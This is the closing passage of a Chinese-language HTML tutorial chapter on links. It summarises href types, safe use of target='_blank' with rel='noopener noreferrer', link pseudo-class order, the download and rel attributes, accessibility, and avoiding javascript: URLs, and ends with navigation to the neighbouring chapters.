- ✅ 视觉反馈：hover, focus 状态
- ✅ 屏幕阅读器友好

</details>

---

**📌 本章总结**

- `href` 支持多种 URL：绝对、相对、锚点、协议链接
- `target="_blank"` 必须配合 `rel="noopener noreferrer"`
- 链接伪类顺序：`:link`, `:visited`, `:hover`, `:active`（LVHA）
- `download` 属性提示下载，但仅对同源资源有效
- `rel` 属性：`nofollow`(SEO), `noopener`(安全), `noreferrer`(隐私)
- 可访问性：有意义的锚文本、足够对比度、图片链接加 alt
- 避免 `javascript:` 协议，防止 XSS 攻击
- 导航菜单使用 `<nav>` + ARIA + 键盘导航

**上一章** ← [第 5 章：列表与定义](./chapter-05.md)  
**下一章** → [第 7 章：图片处理](./chapter-07.md)

---

✅ **第一部分：HTML 基础（1-6章）面试题已完成！**
